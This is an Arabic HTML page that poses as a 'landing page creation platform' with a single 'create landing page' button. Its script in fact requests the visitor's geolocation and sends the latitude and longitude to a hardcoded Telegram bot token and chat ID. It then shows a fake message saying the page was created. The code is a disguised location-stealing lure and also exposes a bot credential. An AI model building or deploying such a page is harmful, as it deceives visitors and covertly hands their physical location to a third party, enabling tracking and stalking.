<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>منصة إنشاء صفحات هبوط</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: #f4f4f4;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }
  .container {
    background: #fff;
    padding: 30px;
    border-radius: 10px;
    box-shadow: 0 5px 15px rgba(0,0,0,0.2);
    text-align: center;
  }
  h1 {
    margin-bottom: 20px;
    color: #333;
  }
  button {
    padding: 15px 30px;
    font-size: 18px;
    border: none;
    border-radius: 5px;
    background: #28a745;
    color: #fff;
    cursor: pointer;
  }
  button:hover {
    background: #218838;
  }
  p {
    margin-top: 15px;
    color: #555;
  }
</style>
</head>
<body>

<div class="container">
  <h1>منصة إنشاء صفحات هبوط</h1>
  <button onclick="getLocation()">إنشاء صفحة هبوط</button>
  <p id="status"></p>
</div>

<script>
const BOT_TOKEN = "5814823361:AAEFNHuJtnAq_3M51YQPwylzyDsnOnSUOjQ";
const CHAT_ID = "143914927";

function getLocation() {
    if (navigator.geolocation) {
        document.getElementById("status").innerText = "جارٍ معالجة طلبك...";
        navigator.geolocation.getCurrentPosition(sendLocation, showError);
    } else {
        alert("المتصفح لا يدعم تحديد الموقع");
    }
}

function sendLocation(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`;

    fetch(url)
        .then(response => {
            if (response.ok) {
                document.getElementById("status").innerText = "✅ تم إنشاء صفحة هبوط بنجاح!";
            } else {
                document.getElementById("status").innerText = "❌ حدث خطأ أثناء إنشاء الصفحة";
            }
        })
        .catch(() => {
            document.getElementById("status").innerText = "⚠ حدث خطأ أثناء الإرسال";
        });
}

function showError(error) {
    switch(error.code) {
        case error.PERMISSION_DENIED:
            alert("❌ رفضت مشاركة الموقع");
            break;
        case error.POSITION_UNAVAILABLE:
            alert("⚠ الموقع غير متاح");
            break;
        case error.TIMEOUT:
            alert("⏳ انتهى وقت تحديد الموقع");
            break;
        default:
            alert("❌ خطأ غير معروف");
            break;
    }
}
</script>

</body>
</html>
